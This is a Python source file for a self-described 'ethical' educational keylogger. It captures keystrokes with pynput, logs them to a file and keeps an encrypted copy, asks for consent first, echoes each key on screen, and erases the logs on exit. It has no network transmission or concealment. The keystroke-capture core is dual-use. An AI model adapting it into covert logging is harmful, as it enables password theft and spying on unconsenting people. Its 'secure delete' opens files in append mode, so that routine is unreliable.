from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import time
import os
import random

class Keylogger:
    def __init__(self):
        self.log_file = f"keystrokes_{random.randint(1000,9999)}.log"  # Unique filename
        self.encrypted_file = f"keystrokes_encrypted_{random.randint(1000,9999)}.bin"
        self.keys = []
        self.start_time = time.time()
        
        # Generate encryption key
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
        self.display_warning()
    
    def display_warning(self):
        """Show ethical use disclaimer and get consent"""
        print("\n" + "="*50)
        print("ETHICAL KEYLOGGER - FOR EDUCATIONAL USE ONLY")
        print("="*50)
        print("[!] This program will:")
        print("- Log keyboard inputs ONLY while running")
        print("- Store data temporarily with encryption")
        print("- AUTO-DELETE all logs when you exit")
        print("- Never transmit data externally\n")
        
        consent = input("Do you agree to proceed? (Y/N): ").strip().lower()
        if consent != 'y':
            print("\n[!] Consent not given. Exiting program.")
            exit()
        
        print("\n[+] Keylogger started. Press ESC to stop logging...\n")
    
    def secure_delete(self, filepath, passes=3):
        """Securely overwrite and delete files"""
        try:
            with open(filepath, "ba+") as f:
                length = f.tell()
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(length))
            os.remove(filepath)
            return True
        except Exception as e:
            return False
    
    def cleanup(self):
        """Delete all log files securely"""
        print("\n[+] Cleaning up log files...")
        files_deleted = 0
        
        if os.path.exists(self.log_file):
            if self.secure_delete(self.log_file):
                print(f"[-] Deleted: {self.log_file}")
                files_deleted += 1
        
        if os.path.exists(self.encrypted_file):
            if self.secure_delete(self.encrypted_file):
                print(f"[-] Deleted: {self.encrypted_file}")
                files_deleted += 1
        
        if files_deleted == 2:
            print("[+] All log files securely erased")
        else:
            print("[!] Could not delete some files (they may not exist)")

    def encrypt_data(self, data):
        """Encrypt the logged data"""
        return self.cipher.encrypt(data.encode())
    
    def write_to_file(self, keys):
        """Write logged keys to file"""
        with open(self.log_file, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("Key.") == -1:
                    f.write(k)
                else:
                    f.write(f"[{k}] ")
            f.write("\n")
        
        # Store encrypted version
        with open(self.log_file, "r") as f:
            encrypted_data = self.encrypt_data(f.read())
            with open(self.encrypted_file, "wb") as ef:
                ef.write(encrypted_data)
    
    def on_press(self, key):
        """Handle key press events"""
        self.keys.append(key)
        
        if len(self.keys) >= 10:
            self.write_to_file(self.keys)
            self.keys = []
        
        try:
            print(f"Typed: {key.char}", end=" ", flush=True)
        except AttributeError:
            print(f"[Special Key: {key}]", end=" ", flush=True)
    
    def on_release(self, key):
        """Handle exit condition"""
        if key == Key.esc:
            if self.keys:
                self.write_to_file(self.keys)
            
            duration = time.time() - self.start_time
            mins, secs = divmod(duration, 60)
            
            print(f"\n\n[+] Session ended after {int(mins)}m {int(secs)}s")
            self.cleanup()  # Auto-delete logs
            return False

    def start(self):
        """Main execution"""
        try:
            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()
        except KeyboardInterrupt:
            self.cleanup()
        except Exception as e:
            print(f"\n[!] Error: {e}")
            self.cleanup()

if __name__ == "__main__":
    logger = Keylogger()
    logger.start()